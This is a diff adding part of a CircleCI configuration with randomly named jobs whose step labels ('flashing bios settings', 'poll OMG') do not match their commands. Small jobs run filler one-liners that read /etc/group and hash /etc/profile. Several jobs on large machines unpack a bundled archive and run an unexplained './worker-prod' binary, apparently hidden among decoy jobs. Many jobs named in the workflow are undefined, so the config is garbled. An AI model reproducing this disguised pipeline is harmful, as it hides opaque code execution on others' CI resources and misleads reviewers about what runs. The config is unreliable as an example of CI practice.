+            { set +o pipefail 2>/dev/null; printf -v sum "%*s" 11 ""; echo "[$sum]"; true ; } > /tmp/qdir/io_src-e2af
+            echo "task=fix-6022"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'io_src-e2af'
+  fix-6022:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/io_src-e2af > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  pixel_noise:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Record petri dishes with fresh tips
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; date -d'@1700000000' +%G-W%V-%u; true ; } > /tmp/qdir/40d346c1
+            echo "task=publish"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - '40d346c1'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/40d346c1 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  MIN_DRIVER_LEN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: flashing bios settings
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; sha512sum /etc/profile|awk '{print $1}'; true ; } > /tmp/qdir/assetKernel
+            echo "task=py310-fmt"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'assetKernel'
+  py310-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/40d346c1 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+
+  cron012:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Cache the hyperparams int8
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; compgen -v | nl -w2 -s". " | sort | wc -w; true ; } > /tmp/qdir/E51
+            echo "task=jul6-smoke"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'E51'
+  depthFn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Please do benchmark the unit tests
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; sed 's/:.*//' /etc/group | shuf -n 3 | sort; true ; } > /tmp/qdir/oyof3b21
+            echo "task=rm-router-v2-leak"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'oyof3b21'
+  LOAd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Flush the swap space in time for good measure
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; echo -n 'take out the trash' | tr a-z A-Z; true ; } > /tmp/qdir/io_src-e2af
+            echo "task=fix-6022"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'io_src-e2af'
+  scarf_country_coffee_height:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Phase Seven Unload
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; awk -F':' '$4 != "" { print $1 }' /etc/group | rev | paste -sd ' '; true ; } > /tmp/qdir/EM
+            echo "task=beta-v4"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'EM'
+  has-backup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: poll OMG
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; echo 'snow expected tomorrow'|awk '{gsub(/[aeiou]/, ""); print}'; true ; } > /tmp/qdir/temp2d18a0
+            echo "task=fiona-ship"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'temp2d18a0'
+  l3v31:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close the late fees for audit
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; find /run -user $(id -un) 2>/dev/null | wc -l; true ; } > /tmp/qdir/dJS0clA18Ge8OMVum3v
+            echo "task=fix-router"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'dJS0clA18Ge8OMVum3v'
+  futures_v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Else page the incident channel
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; od -An -tu1 -N12 /dev/urandom | tr -s ' ' '\n' | grep . | awk '{print $1 * 2}' | sort -n | tail -n1; true ; } > /tmp/qdir/obj_hw
+            echo "task=hu-test"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'obj_hw'
+workflows:
+  workflow:
+    jobs:
+      - helmet-6x
+      - py311-release:
+          requires:
+            - helmet-6x
+      - err:
+          requires:
+            - helmet-6x
+      - tb-v2:
+          requires:
+            - err
+      - alice_x:
+          requires:
+            - err
+      - tango:
+          requires:
+            - alice_x
+      - summer069275:
+          requires:
+            - alice_x
+      - v9-alpha4:
+          requires:
+            - summer069275
+      - team-papa:
+          requires:
+            - summer069275
+      - v5-canary2:
+          requires:
+            - team-papa
+      - handler-020612:
+          requires:
+            - team-papa
+      - deploy:
+          requires:
+            - handler-020612
+      - disabledYes:
+          requires:
+            - handler-020612
+      - greg-run:
+          requires:
+            - disabledYes
+      - login_10_4_22:
+          requires:
+            - disabledYes
+      - romeo-6:
+          requires:
+            - login_10_4_22
+      - slot_cancel:
+          requires:
+            - login_10_4_22
+      - jul26-release:
+          requires:
+            - slot_cancel
+      - Date-Span-Mesh:
+          requires:
+            - slot_cancel
+      - hyperion-rev:
+          requires:
+            - Date-Span-Mesh
+      - pixel_noise
+      - MIN_DRIVER_LEN
+      - publish:
+          requires:
+            - pixel_noise
+            - MIN_DRIVER_LEN
+      - py310-fmt:
+          requires:
+            - pixel_noise
+            - MIN_DRIVER_LEN
+      - kilo:
+          requires:
+            - pixel_noise
+            - MIN_DRIVER_LEN
+      - charlie:
+          requires:
+            - pixel_noise
+            - MIN_DRIVER_LEN
+      - v7-ga:
+          requires:
+            - pixel_noise
+            - MIN_DRIVER_LEN
+      - fetchHTTPS
+      - cron012:
+          requires:
+            - fetchHTTPS
+      - jul6-smoke:
+          requires:
+            - cron012
+      - by4:
+          requires:
+            - cron012
+      - depthFn:
+          requires:
+            - by4
+      - rm-router-v2-leak:
+          requires:
+            - depthFn
+      - constNum:
+          requires:
+            - depthFn
+      - LOAd:
+          requires:
+            - constNum
+      - fix-6022:
+          requires:
+            - LOAd
+      - SidebarSpec:
+          requires:
+            - LOAd
+      - scarf_country_coffee_height:
+          requires:
+            - SidebarSpec
+      - beta-v4:
+          requires:
+            - scarf_country_coffee_height
+      - Stage-Model:
+          requires:
+            - scarf_country_coffee_height
+      - has-backup:
+          requires:
+            - Stage-Model
+      - fiona-ship:
+          requires:
+            - has-backup
+      - cursor_cell:
+          requires:
+            - has-backup
+      - l3v31:
+          requires:
+            - cursor_cell
+      - fix-router:
+          requires:
+            - l3v31
+      - aud311:
+          requires:
+            - l3v31
+      - futures_v2:
+          requires:
+            - aud311
+      - hu-test:
+          requires:
+            - futures_v2
+      - CONST_CALLBACK_PATH_16
+      - Prepare_Staging6:
+          requires:
+            - CONST_CALLBACK_PATH_16
+      - NextScopeClockBody:
+          requires:
+            - CONST_CALLBACK_PATH_16
+      - MERGE_LAB:
+          requires:
+            - NextScopeClockBody
+      - DEL_P:
+          requires:
+            - NextScopeClockBody
+      - canary:
+          requires:
+            - DEL_P
+      - FTR-ITEM-REC:
+          requires:
+            - DEL_P
+      - update-login-leak:
+          requires:
+            - FTR-ITEM-REC
+      - orangeish:
+          requires:
+            - FTR-ITEM-REC
+      - cf-3:
+          requires:
+            - orangeish
+      - WSIPRouter:
+          requires:
+            - orangeish
+      - shippit:
+          requires:
+            - WSIPRouter
+      - Save-Writer2:
+          requires:
+            - WSIPRouter
+      - green-light-go:
+          requires:
+            - Save-Writer2
+      - xref_POINT:
+          requires:
+            - Save-Writer2
+      - yolo:
+          requires:
+            - xref_POINT
